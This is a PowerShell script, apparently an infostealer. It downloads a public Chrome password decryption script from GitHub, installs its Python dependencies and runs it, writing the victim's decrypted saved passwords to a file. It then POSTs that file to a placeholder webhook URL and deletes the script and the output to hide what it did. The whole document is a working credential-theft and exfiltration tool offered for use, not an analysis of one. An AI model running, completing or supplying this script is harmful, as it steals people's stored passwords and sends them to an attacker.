# Define the URL of the Python script
$scriptUrl = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py"

# Define the directory where you want to download the script
$scriptDir = "D:\"
$scriptPath = Join-Path -Path $scriptDir -ChildPath "decrypt_chrome_password.py"

# Define the output file path
$outputFilePath = Join-Path -Path $scriptDir -ChildPath "output.txt"

# Download the Python script from GitHub
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Install required Python packages
pip install pypiwin32 pycryptodome pycryptodomex

# Execute the Python script and store the output
$output = python $scriptPath

# Write the output to a file
$output | Out-File -FilePath $outputFilePath

# Send the output to the webhook URL
Invoke-WebRequest -Uri "<Weebhook URL>" -Method POST -InFile $outputFilePath

Remove-Item -Path $scriptPath
Remove-Item -Path $outputFilePath
